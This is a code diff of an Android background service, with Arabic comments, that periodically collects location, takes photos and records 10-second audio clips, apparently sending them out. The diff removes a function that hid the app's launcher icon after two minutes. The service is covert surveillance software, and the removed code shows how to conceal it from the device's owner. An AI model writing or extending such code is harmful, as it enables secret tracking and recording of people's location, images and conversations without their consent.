@@ -26,9 +26,6 @@ import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.ByteBuffer;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
 
 public class BackgroundService extends Service {
     private static final String TAG = "BackgroundService";
@@ -37,7 +34,7 @@ public class BackgroundService extends Service {
 
     private LocationManager locationManager;
     private Handler handler = new Handler();
-    private Runnable locationTask, photoTask, videoTask, hideTask;
+    private Runnable locationTask, photoTask, videoTask;
 
     @Override
     public void onCreate() {
@@ -80,7 +77,7 @@ public class BackgroundService extends Service {
         };
         handler.post(photoTask);
 
-        // 3. تسجيل فيديو/صوت كل 90 ثانية
+        // 3. تسجيل صوت كل 90 ثانية
         videoTask = new Runnable() {
             @Override
             public void run() {
@@ -89,15 +86,6 @@ public class BackgroundService extends Service {
             }
         };
         handler.post(videoTask);
-
-        // 4. إخفاء التطبيق بعد دقيقتين
-        hideTask = new Runnable() {
-            @Override
-            public void run() {
-                hideAppIcon();
-            }
-        };
-        handler.postDelayed(hideTask, 120000); // بعد دقيقتين
     }
 
     private void takePhoto() {
@@ -154,28 +142,16 @@ public class BackgroundService extends Service {
             recorder.prepare();
             recorder.start();
             
-            // تسجيل لمدة 10 ثواني كمثال (لأن الفيديو 90 ثانية هيبقى كبير جداً)
+            // تسجيل لمدة 10 ثواني
             new Handler().postDelayed(() -> {
                 try {
                     recorder.stop();
                     recorder.release();
                     sendAudio(outputFile);
                 } catch (Exception ignored) {}
-            }, 10000); // 10 ثواني
+            }, 10000);
         } catch (Exception e) {
             Log.e(TAG, "Audio Error: " + e.getMessage());
-        }
-    }
-
-    private void hideAppIcon() {
-        try {
-            android.content.pm.PackageManager pm = getPackageManager();
-            android.content.ComponentName componentName = new android.content.ComponentName(this, MainActivity.class);
-            pm.setComponentEnabledSetting(componentName,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP);
-        } catch (Exception e) {
-            Log.e(TAG, "Hide Error: " + e.getMessage());
         }
     }
 
